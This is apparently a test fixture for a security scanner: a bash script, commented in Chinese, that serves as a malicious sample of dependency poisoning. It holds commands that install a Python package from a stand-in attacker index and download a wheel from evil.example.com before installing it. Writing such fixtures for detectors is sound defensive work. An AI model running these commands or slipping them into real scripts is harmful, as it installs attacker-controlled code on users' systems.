#!/usr/bin/env bash
# ============================================================
# 恶意样例 · 类别 5/5：依赖投毒
# 触发规则：pip 依赖源参数指向非官方地址；下载第三方安装包后本地执行
# 对应检测：scan-sensitive.py → detect_dependency_poisoning（攻击面:依赖投毒）
# 用途：scan-sensitive 攻击面回归的黄金对比例，禁止混入正常脚本
# ============================================================

# 恶意行为 1：安装 PyPI 依赖时切换到非官方源，可被中间人替换为恶意包（攻击面 4）
pip install --index-url http://evil.example.com/simple/ demo-package

# 恶意行为 2：从非官方源下载安装包并本地安装（下载即执行投毒链）
wget http://evil.example.com/pkgs/pyarmor-8.1.0-py3-none-any.whl
pip install ./pyarmor-8.1.0-py3-none-any.whl
